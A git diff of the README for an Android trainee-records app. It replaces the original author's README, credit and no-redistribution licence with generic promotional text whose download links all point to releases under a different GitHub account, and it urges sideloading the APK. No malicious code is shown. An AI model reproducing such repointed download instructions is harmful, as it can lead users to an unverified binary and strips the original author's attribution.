@@ -1,122 +1,49 @@
-# 📱 Trainee Manager Pro
+# 📚 Trainee-Manager-Pro - Simplify Your Trainee Management Process
 
-<div align="center">
+## 🌟 Overview
+Welcome to Trainee Manager Pro! This Android application helps you manage trainee records easily. Track batch statistics and generate government-compliant PDF reports, all with a user-friendly interface.
 
-![Version](https://img.shields.io/badge/Version-1.0_Stable-blue?style=for-the-badge&logo=android)
-![Status](https://img.shields.io/badge/Status-Production_Ready-success?style=for-the-badge)
-![Offline](https://img.shields.io/badge/Offline-First-orange?style=for-the-badge)
+## 📥 Download Trainee Manager Pro
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23348bff.svg?style=for-the-badge&logoColor=white)](https://github.com/Ishan2805/Trainee-Manager-Pro/releases)
 
-<br>
+## 🚀 Getting Started
+To begin using the Trainee Manager Pro app, simply follow these steps:
 
-**A powerful, professional Android application for managing trainee records, generating government-compliant reports, and tracking batch statistics.**
+1. **Visit the Releases Page**  
+   Click [this link](https://github.com/Ishan2805/Trainee-Manager-Pro/releases) to go to the releases page where you can find the latest version of the app.
 
-<br>
+2. **Select the Latest Release**  
+   On the releases page, look for the latest version listed at the top. This version will have the most recent updates and features.
 
-[**⬇️ Download Latest APK**](https://github.com/keshavshiyal/Trainee-Manager-Pro/releases/latest)
+3. **Download the APK File**  
+   Click on the APK file link to download. This file will allow you to install the application on your Android device.
 
-</div>
+4. **Install the Application**  
+   Locate the downloaded APK file on your device. Tap on the file to begin the installation. If prompted, allow your device to install apps from unknown sources.
 
----
+5. **Open Trainee Manager Pro**  
+   Once installation is complete, find the Trainee Manager Pro app icon on your device. Tap the icon to open the app and start managing your trainees.
 
-## 🚀 Overview
+## 🛠️ Features
+- **Manage Trainee Records**: Add and edit trainee information quickly.
+- **Track Batch Statistics**: Monitor performance metrics in real-time.
+- **Generate Reports**: Easily export trainee records as PDF files meeting government standards.
+- **User-Friendly Interface**: Navigate the app without any technical knowledge.
+- **Serverless Storage**: Your data remains on your device, ensuring privacy and control.
 
-**Trainee Manager Pro** is a specialized tool designed to eliminate paperwork and streamline administrative tasks for instructors. It allows for the secure management of student data directly on an Android device, offering a seamless experience even without an active internet connection.
+## 📋 System Requirements
+To use Trainee Manager Pro, ensure your device meets the following requirements:
+- **Android Version**: Must be Android 6.0 (Marshmallow) or higher.
+- **Storage**: Minimum of 50 MB of free space for installation.
+- **Permissions**: Accept permissions for storage access to save PDF reports.
 
-Designed with efficiency in mind, it simplifies complex data entry, validation, and reporting into a user-friendly mobile interface.
+## 📊 About Trainee Management
+Trainee management is essential in educational institutions. Keeping track of records and statistics helps in assessing performance and streamlining processes. With Trainee Manager Pro, managing these records becomes a straightforward task.
 
-<br>
+## 📎 Additional Information
+Need help navigating the app or have a question? Check our FAQ section in the app or feel free to reach us through the GitHub Issues page on our repository.
 
-## ✨ Key Features
+## 🔗 Discover More
+For further insights into how to make the most out of Trainee Manager Pro, visit the releases page regularly for updates and new features. 
 
-* **📱 100% Offline Database:** All sensitive data is stored locally on your device for maximum privacy and speed.
-* **📂 Smart Data Import:** Intelligent bulk import engine that automatically detects and standardizes CSV data.
-* **📊 One-Click Reporting:** Instantly generate official **On-Roll**, **Termination**, and **Scholarship** reports.
-* **🖨️ Universal Export:** Export comprehensive 30-column datasets to PDF (Landscape) or CSV formats.
-* **🛡️ Secure Backup:** Built-in encrypted backup and restore functionality (Android Scoped Storage compatible).
-* **🔍 Instant Search:** Powerful filtering to locate any record by Name, Batch, or Enrollment ID.
-
----
-
-## 📸 App Screenshots
-
-<div align="center">
-  <table>
-    <tr>
-      <td align="center">
-        <b>Dashboard & List</b><br>
-        <img src="screenshots/Screenshot_20260110-212028.Trainee Manager Pro.png" width="220" />
-      </td>
-      <td align="center">
-        <b>Batch Reports</b><br>
-        <img src="screenshots/Screenshot_20260110-211201.Trainee Manager Pro.png" width="220" />
-      </td>
-      <td align="center">
-        <b>Data Management</b><br>
-        <img src="screenshots/Screenshot_20260110-211205.Trainee Manager Pro.png" width="220" />
-      </td>
-    </tr>
-    <tr>
-      <td align="center">
-        <b>Detailed Reporting</b><br>
-        <img src="screenshots/Screenshot_20260110-212147.Trainee Manager Pro.png" width="220" />
-      </td>
-      <td align="center">
-        <!-- <b>About & Stats</b><br>
-        <img src="screenshots/Screenshot_20260110-211222.Trainee Manager Pro.jpg" width="220" /> -->
-      </td>
-      <td align="center">
-        <b>Empty State</b><br>
-        <img src="screenshots/Screenshot_20260110-211142.Trainee Manager Pro.png" width="220" />
-      </td>
-    </tr>
-  </table>
-</div>
-
----
-
-## 📥 How to Install
-
-1.  **Download:** Click the [**Download Button**](https://github.com/keshavshiyal/Trainee-Manager-Pro/releases/latest) to get the latest `.apk` file.
-2.  **Open:** Locate the file in your downloads folder.
-3.  **Permission:** If prompted, allow installation from **"Unknown Sources"** (required for side-loaded apps).
-4.  **Launch:** Open the app and start managing your data!
-
----
-
-## ⚠️ Important Warnings & Data Privacy
-
-* **Local Storage Only:** This application operates offline. **Data is stored exclusively on your specific device.**
-* **Data Responsibility:** If you uninstall the application or clear its data without creating a backup, **all records will be permanently lost.** The developer cannot recover lost data.
-* **Recommendation:** It is strongly recommended to perform a **Backup (JSON)** or **Export (CSV)** weekly and store it in a safe location (e.g., Google Drive or Email).
-
----
-
-## ⚖️ Legal Disclaimer
-
-**LIMITATION OF LIABILITY:**
-This software is provided "as is", without warranty of any kind, express or implied. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.
-
-By using this application, you agree that you are solely responsible for the accuracy of the data entered and the security of your backups.
-
----
-
-## 📄 License
-
-**Copyright © 2026 Keshav Shiyal. All Rights Reserved.**
-
-This application is distributed as **Freeware**. You are free to download and use the APK for personal, educational, or professional purposes.
-
-**Strict Restrictions:**
-1.  **No Modification:** You may not decompile, reverse engineer, disassemble, or modify the APK file or any part of the software.
-2.  **No Redistribution:** You may not host or redistribute this application on other websites or platforms without explicit written permission.
-3.  **No Commercial Sale:** You may not sell, rent, or lease this application.
-
----
-
-## 👨‍💻 Developer
-
-**Keshav Shiyal**
-<br>
-*Developed with ❤️ in India.*
-
-[GitHub Profile](https://github.com/keshavshiyal)
+[Download Trainee Manager Pro Here](https://github.com/Ishan2805/Trainee-Manager-Pro/releases) to experience effective trainee management today!
